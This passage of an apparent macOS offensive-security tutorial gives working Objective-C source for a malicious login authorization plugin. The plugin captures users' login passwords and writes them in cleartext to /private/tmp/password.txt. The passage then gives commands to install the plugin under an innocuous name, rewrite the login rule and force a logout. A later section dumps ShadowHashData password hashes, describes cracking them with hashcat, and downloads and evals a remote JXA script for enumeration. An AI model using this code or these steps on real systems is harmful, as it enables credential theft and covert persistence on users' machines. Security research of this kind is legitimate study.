</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Security/AuthorizationTags.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;CoreServices/CoreServices.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&#34;Common.h&#34;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;syslog.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define kKMAuthAuthorizeRight &#34;authorize-right&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define kMechanismMagic &#34;MLSP&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define kPluginMagic &#34;PlgN&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> PluginRecord {
</span></span><span style="display:flex;"><span>    OSType                          fMagic;         <span style="color:#6272a4">// must be kPluginMagic
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">const</span> AuthorizationCallbacks <span style="color:#ff79c6">*</span>  fCallbacks;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> PluginRecord PluginRecord;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> MechanismRecord {
</span></span><span style="display:flex;"><span>    OSType                          fMagic;         <span style="color:#6272a4">// must be kMechanismMagic
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    AuthorizationEngineRef          fEngine;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> PluginRecord <span style="color:#ff79c6">*</span>            fPlugin;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">Boolean</span>                         fWaitForDebugger;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> MechanismRecord MechanismRecord;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSString <span style="color:#ff79c6">*</span><span style="color:#50fa7b">GetStringFromContext</span>(<span style="color:#ff79c6">struct</span> MechanismRecord <span style="color:#ff79c6">*</span>mechanism, AuthorizationString key) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> AuthorizationValue <span style="color:#ff79c6">*</span>value;
</span></span><span style="display:flex;"><span>    AuthorizationContextFlags flags;
</span></span><span style="display:flex;"><span>    OSStatus err <span style="color:#ff79c6">=</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>GetContextValue(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine, key, <span style="color:#ff79c6">&amp;</span>flags, <span style="color:#ff79c6">&amp;</span>value);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (err <span style="color:#ff79c6">==</span> errSecSuccess <span style="color:#ff79c6">&amp;&amp;</span> value<span style="color:#ff79c6">-&gt;</span>length <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>s <span style="color:#ff79c6">=</span> [[NSString alloc] <span style="color:#8be9fd;font-style:italic">initWithBytes</span>:value<span style="color:#ff79c6">-&gt;</span>data
</span></span><span style="display:flex;"><span>                                            <span style="color:#8be9fd;font-style:italic">length</span>:value<span style="color:#ff79c6">-&gt;</span>length
</span></span><span style="display:flex;"><span>                                             <span style="color:#8be9fd;font-style:italic">encoding</span>:NSUTF8StringEncoding];
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> [s <span style="color:#8be9fd;font-style:italic">stringByReplacingOccurrencesOfString</span>:<span style="color:#f1fa8c">@&#34;</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#8be9fd;font-style:italic">withString</span>:<span style="color:#f1fa8c">@&#34;&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">nil</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSString <span style="color:#ff79c6">*</span><span style="color:#50fa7b">GetStringFromHint</span>(MechanismRecord <span style="color:#ff79c6">*</span>mechanism, AuthorizationString key) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">const</span> AuthorizationValue <span style="color:#ff79c6">*</span>value;
</span></span><span style="display:flex;"><span>    OSStatus err <span style="color:#ff79c6">=</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>GetHintValue(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine, key,<span style="color:#ff79c6">&amp;</span>value);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (err <span style="color:#ff79c6">==</span> errSecSuccess <span style="color:#ff79c6">&amp;&amp;</span> value<span style="color:#ff79c6">-&gt;</span>length <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>s <span style="color:#ff79c6">=</span> [[NSString alloc] <span style="color:#8be9fd;font-style:italic">initWithBytes</span>:value<span style="color:#ff79c6">-&gt;</span>data
</span></span><span style="display:flex;"><span>                                               <span style="color:#8be9fd;font-style:italic">length</span>:value<span style="color:#ff79c6">-&gt;</span>length
</span></span><span style="display:flex;"><span>                                             <span style="color:#8be9fd;font-style:italic">encoding</span>:NSUTF8StringEncoding];
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> [s <span style="color:#8be9fd;font-style:italic">stringByReplacingOccurrencesOfString</span>:<span style="color:#f1fa8c">@&#34;</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#8be9fd;font-style:italic">withString</span>:<span style="color:#f1fa8c">@&#34;&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">nil</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">AllowLogin</span>(MechanismRecord <span style="color:#ff79c6">*</span>mechanism) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>SetResult(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine,kAuthorizationResultAllow);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismCreate</span>(AuthorizationPluginRef inPlugin,AuthorizationEngineRef inEngine,AuthorizationMechanismId mechanismId,AuthorizationMechanismRef <span style="color:#ff79c6">*</span>outMechanism) {
</span></span><span style="display:flex;"><span>    MechanismRecord <span style="color:#ff79c6">*</span>mechanism <span style="color:#ff79c6">=</span> (MechanismRecord <span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(MechanismRecord));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (mechanism <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) <span style="color:#ff79c6">return</span> errSecMemoryError;
</span></span><span style="display:flex;"><span>    mechanism<span style="color:#ff79c6">-&gt;</span>fMagic <span style="color:#ff79c6">=</span> kMechanismMagic;
</span></span><span style="display:flex;"><span>    mechanism<span style="color:#ff79c6">-&gt;</span>fEngine <span style="color:#ff79c6">=</span> inEngine;
</span></span><span style="display:flex;"><span>    mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin <span style="color:#ff79c6">=</span> (PluginRecord <span style="color:#ff79c6">*</span>)inPlugin;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>outMechanism <span style="color:#ff79c6">=</span> mechanism;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismDestroy</span>(AuthorizationMechanismRef inMechanism) {
</span></span><span style="display:flex;"><span>    free(inMechanism);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismInvoke</span>(AuthorizationMechanismRef inMechanism) {
</span></span><span style="display:flex;"><span>    MechanismRecord <span style="color:#ff79c6">*</span>mechanism <span style="color:#ff79c6">=</span> (MechanismRecord <span style="color:#ff79c6">*</span>)inMechanism;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">@autoreleasepool</span> {
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Make sure this is not a hidden user.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>username <span style="color:#ff79c6">=</span> GetStringFromContext(mechanism, kAuthorizationEnvironmentUsername);
</span></span><span style="display:flex;"><span>        NSString <span style="color:#ff79c6">*</span>password <span style="color:#ff79c6">=</span> GetStringFromContext(mechanism, kAuthorizationEnvironmentPassword);
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// NSString *sesOwner = GetStringFromHint(mechanism, kKMAuthSuggestedUser);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        NSString <span style="color:#ff79c6">*</span>AuthAuthorizeRight <span style="color:#ff79c6">=</span> GetStringFromHint(mechanism, kKMAuthAuthorizeRight);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Make sure we have username and password data.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>username <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>password) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> AllowLogin(mechanism);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">BOOL</span> keychainPasswordValid <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">YES</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        SecKeychainSetUserInteractionAllowed(<span style="color:#8be9fd;font-style:italic">NO</span>);
</span></span><span style="display:flex;"><span>        keychainPasswordValid <span style="color:#ff79c6">=</span> ValidateLoginKeychainPassword(password);
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Revert back to the default ids
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        pthread_setugid_np(KAUTH_UID_NONE, KAUTH_GID_NONE);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//NSData *passwordData = [NSKeyedArchiver archivedDataWithRootObject:password];
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (keychainPasswordValid) {
</span></span><span style="display:flex;"><span>            [password <span style="color:#8be9fd;font-style:italic">writeToFile</span>:<span style="color:#f1fa8c">@&#34;/private/tmp/password.txt&#34;</span> <span style="color:#8be9fd;font-style:italic">atomically</span>:<span style="color:#8be9fd;font-style:italic">TRUE</span> <span style="color:#8be9fd;font-style:italic">encoding</span>:NSUTF8StringEncoding <span style="color:#8be9fd;font-style:italic">error</span>:<span style="color:#8be9fd;font-style:italic">NULL</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> AllowLogin(mechanism);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">MechanismDeactivate</span>(AuthorizationMechanismRef inMechanism) {
</span></span><span style="display:flex;"><span>    MechanismRecord <span style="color:#ff79c6">*</span>mechanism <span style="color:#ff79c6">=</span> (MechanismRecord <span style="color:#ff79c6">*</span>)inMechanism;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> mechanism<span style="color:#ff79c6">-&gt;</span>fPlugin<span style="color:#ff79c6">-&gt;</span>fCallbacks<span style="color:#ff79c6">-&gt;</span>DidDeactivate(mechanism<span style="color:#ff79c6">-&gt;</span>fEngine);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">PluginDestroy</span>(AuthorizationPluginRef inPlugin) {
</span></span><span style="display:flex;"><span>    free(inPlugin);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSStatus <span style="color:#50fa7b">AuthorizationPluginCreate</span>(
</span></span><span style="display:flex;"><span>                                   <span style="color:#ff79c6">const</span> AuthorizationCallbacks <span style="color:#ff79c6">*</span>callbacks,
</span></span><span style="display:flex;"><span>                                   AuthorizationPluginRef <span style="color:#ff79c6">*</span>outPlugin,
</span></span><span style="display:flex;"><span>                                   <span style="color:#ff79c6">const</span> AuthorizationPluginInterface <span style="color:#ff79c6">**</span>outPluginInterface) {
</span></span><span style="display:flex;"><span>    PluginRecord <span style="color:#ff79c6">*</span>plugin <span style="color:#ff79c6">=</span> (PluginRecord <span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(PluginRecord));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (plugin <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) <span style="color:#ff79c6">return</span> errSecMemoryError;
</span></span><span style="display:flex;"><span>    plugin<span style="color:#ff79c6">-&gt;</span>fMagic <span style="color:#ff79c6">=</span> kPluginMagic;
</span></span><span style="display:flex;"><span>    plugin<span style="color:#ff79c6">-&gt;</span>fCallbacks <span style="color:#ff79c6">=</span> callbacks;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>outPlugin <span style="color:#ff79c6">=</span> plugin;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">static</span> AuthorizationPluginInterface pluginInterface <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>        kAuthorizationPluginInterfaceVersion,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>PluginDestroy,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismCreate,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismInvoke,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismDeactivate,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>MechanismDestroy
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>outPluginInterface <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>pluginInterface;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> errSecSuccess;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>opening the project in XCode, there are some housekeeping items to be performed first.</p>
<p><p class="imgp">
  <img loading="lazy" src="/plugin-info.png" alt="alt text"  />
</p>
</p>
<p>the <code>info.plist</code> shows the high-level details of the plugin, including the bundle name and bundle identifier. we&rsquo;ll change this to be something a little more innocuous.</p>
<p><p class="imgp">
  <img loading="lazy" src="/plugin-name.png" alt="alt text"  />
</p>
</p>
<p><p class="imgp">
  <img loading="lazy" src="/plugin-bundleID.png" alt="alt text"  />
</p>
</p>
<p>note: the bundle name and identifier should match.</p>
<p>build the project in XCode (Product -&gt; Build), and then access the build via the Products directory on the left. when you find it in Finder, compress it and copy it over to the <code>/Library/Security/SecurityAgentPlugins</code> directory. once it&rsquo;s copied over, unzip it into the directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo cp evilAuthPlugin.bundle.zip /Library/Security/SecurityAgentPlugins
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sudo unzip evilAuthPlugin.bundle.zip             
</span></span><span style="display:flex;"><span>Archive:  evilAuthPlugin.bundle.zip
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/Contents/
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/Contents/_CodeSignature/
</span></span><span style="display:flex;"><span>   creating: evilAuthPlugin.bundle/Contents/MacOS/
</span></span><span style="display:flex;"><span>  inflating: evilAuthPlugin.bundle/Contents/Info.plist  
</span></span><span style="display:flex;"><span>  inflating: evilAuthPlugin.bundle/Contents/_CodeSignature/CodeResources  
</span></span><span style="display:flex;"><span>  inflating: evilAuthPlugin.bundle/Contents/MacOS/evilAuthPlugin  
</span></span></code></pre></div><p>before proceeding, we have to modify the <code>poc.plist</code> file. add the following line: <code>&lt;string&gt;BundleName:login,privileged&lt;/string&gt;</code> to the file, so that it looks like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;plist version=&#34;1.0&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;dict&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;class&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;evaluate-mechanisms&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;comment&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;string&gt;Login mechanism based rule.  Not for general use, yet.&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;created&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;mechanisms&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;array&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:prelogin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:policy-banner&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-begin&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:reset-password,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:FDESupport,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:forward-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:auto-login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:authenticate,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;PKINITMechanism:auth,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;builtin:login-success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:success&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;HomeDirMechanism:status&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;BundleName:login,privileged&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;MCXMechanism:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;CryptoTokenKit:login&lt;/string&gt;
</span></span><span style="display:flex;"><span>		&lt;string&gt;loginwindow:done&lt;/string&gt;
</span></span><span style="display:flex;"><span>	&lt;/array&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;modified&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;real&gt;719346785.95490503&lt;/real&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;shared&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;true/&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;tries&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;10000&lt;/integer&gt;
</span></span><span style="display:flex;"><span>	&lt;key&gt;version&lt;/key&gt;
</span></span><span style="display:flex;"><span>	&lt;integer&gt;11&lt;/integer&gt;
</span></span><span style="display:flex;"><span>&lt;/dict&gt;
</span></span><span style="display:flex;"><span>&lt;/plist&gt;
</span></span></code></pre></div><p>update the authorization database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>security authorizationdb write system.login.console &lt; poc.plist      
</span></span><span style="display:flex;"><span>YES <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>you can force logout the user via the following command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo launchctl bootout user/<span style="color:#ff79c6">$(</span>id -u &lt;username&gt;<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>when they log back in, the code will have executed and the password will be at <code>/private/tmp/password.txt</code>!</p>
<p>just some notes on this method, if you&rsquo;re experimenting: modifying the login process is quite risky, and potentially dangerous. if you&rsquo;re not sure what you&rsquo;re doing, you could prevent anybody from logging in (including yourself) via the login screen.</p>
<h1 id="credential-access-via-shadowhashdata">credential access via ShadowHashData</h1>
<p><code>ShadowHashData</code> is a mechanism in macOS used to store hashed password data for user accounts. it&rsquo;s stored as binary <code>.plist</code> files for each user account in <code>/var/db/dslocal/nodes/Default/users/</code>.</p>
<p>you can extract it via <code>default</code> or <code>dscl</code> utilities.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo dscl . <span style="color:#8be9fd;font-style:italic">read</span> /Users/<span style="color:#8be9fd;font-style:italic">$USERNAME</span> ShadowHashData
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dsAttrTypeNative:ShadowHashData:
</span></span><span style="display:flex;"><span> 62706c69 <span style="color:#bd93f9">73743030</span> d2010203 0a5f101e 5352502d <span style="color:#bd93f9">52464335</span> 3035342d <span style="color:#bd93f9">34303936</span> 2d534841 3531322d 50424b44 46325f10 1453414c 5445442d <span style="color:#bd93f9">53484135</span> 31322d50 424b4446 32d30405 <span style="color:#bd93f9">06070809</span> <span style="color:#bd93f9">58766572</span> <span style="color:#bd93f9">69666965</span> <span style="color:#bd93f9">72547361</span> 6c745a69 <span style="color:#bd93f9">74657261</span> 74696f6e 734f1102 004350d6 29ecef1f 122a15ae ee030fa6 fa552525 6994b148 c9bdb3e0 bb652c88 0b82b334 4886ac55 9f04e045 bb494aea e73a5914 b68eb607 fd812f54 1c6ce2f5 c773be52 77c471bc 89df7ebd 0a0298b9 aa407330 e92816bf 732c10b0 09922f04 628fe872 b1b37778 0bd8221c d3487bee 42cf6a15 67802d13 4db26656 d0f2c17f 7c3ed954 c9fe56b8 615553a7 931ec655 4f526f5c c4541874 795b9b77 ce69d038 3380f493 c49d84ce 6e3f5d1c 0bb3df13 8bb379fb <span style="color:#bd93f9">99473936</span> 817ba675 0409b97d 7026ab75 3778473c a51926a2 b1745b72 <span style="color:#bd93f9">28285997</span> 524e7ef0 4821f41e f6e1979f 88c0a2c1 103773d4 cc69b5e5 0515be57 7c901e6b 3abae24f 7716b146 c3763881 d1c41f79 3dee9577 3f66f969 db2ab6bb 331bd518 438e1d56 1e314fa1 c78ea486 ff7f09db 5bb94565 5406ff15 597396cb 6b4832bf 2baab2e8 3f9ed76f e6c0e11a 130f5403 59c2b47c 33b78f4f 0b969805 47ff5030 149a94e7 37fcf4a4 1d6e1837 d31e26ff 6c4de92f 5c0bce93 d9498299 a0d15668 2557da09 748c24a0 c20bc995 8b119c85 92f8c319 f17ac5c8 6631b9d8 11803fb6 ca2af51b 3ab52af7 354f61e1 87dcc684 <span style="color:#bd93f9">57259217</span> 32343cdd 200ec9bd fdb38f6a 3ffb135c 3d095b3d e40ac620 a3975056 ca8ee84a 175198b0 8c471e54 d2637140 eaaf40a8 673c8f70 b5fc4033 77a46b8b 0c65a69f 3817b8de fa028a7c 146705d6 1000652c dd4a6dce bf0d7aaf 2a4f1020 ba98c293 c1461cf9 c4df9952 569b14b9 1ff176e0 eddaee7c a4583f2d 097287c1 1200022e 09d30b05 060c0d09 57656e74 726f7079 4f1080e9 a36c9b06 438acd06 8982b946 ffa90aac e01574e3 cf98628c 4348784e 1630f0de 9e018c55 77d5d376 cc335136 57d3a593 e1fa565c 53b4a3fd 7dc1599e 2e60b3e1 f815a1d2 612f86cf 6e26d143 a0f202cc 5c0182a9 ea973682 cfd7859e 82ebc85b abdc8be1 845d26ce bb4a3594 f1654b86 e8476c4e 7d566916 0ae8c052 3491a94f 10205a83 6c31ba4a a34077d9 <span style="color:#bd93f9">67368267</span> d314ddfa 2808e96e 6b58119a 26df3f67 c8c40008 000d002e 0045004c 0055005a <span style="color:#bd93f9">00650269</span> 028c0291 029802a0 <span style="color:#bd93f9">03230000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">02010000</span> <span style="color:#bd93f9">00000000</span> 000e0000 <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">0346</span>
</span></span></code></pre></div><p>this contains the hashing algorithm (like PBKDF2), the number of iterations, the salt, and <strong>entropy</strong> (i.e. the actual hashed password.)</p>
<p>you can attempt to crack this using <code>hashcat</code>, with the form <code>$ml$[iterations]$[salt]$[entropy]</code>, but this will be painfully slow.</p>
<p>instead, we can use <a href="https://github.com/its-a-feature/Orchard/blob/master/Orchard.js"  target="_blank" rel="noreferrer nofollow">Orchard</a>
 to leverage JXA (JavaScript for Automation) to do some enumeration.</p>
<p>set up a scripting environment:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ osascript -l JavaScript -i
</span></span></code></pre></div><p>then enter the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">eval</span>(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(<span style="color:#f1fa8c">&#39;https://raw.githubusercontent.com/its-a-feature/Orchard/master/Orchard.js&#39;</span>)),$.NSUTF8StringEncoding)));
</span></span></code></pre></div><p>you can now call functions inside this environment. for example, i want to get my local user data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>Get_LocalUser({user<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;bilal&#34;</span>})
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/shadow.png" alt="alt text"  />
</p>
</p>
<p>the output here is massive. i&rsquo;m interested in <code>dsAttrTypeNative:ShadowHashData</code>, which manifests as a base64 blob. it&rsquo;s easier to save the output to a file, then <code>grep</code> it.</p>
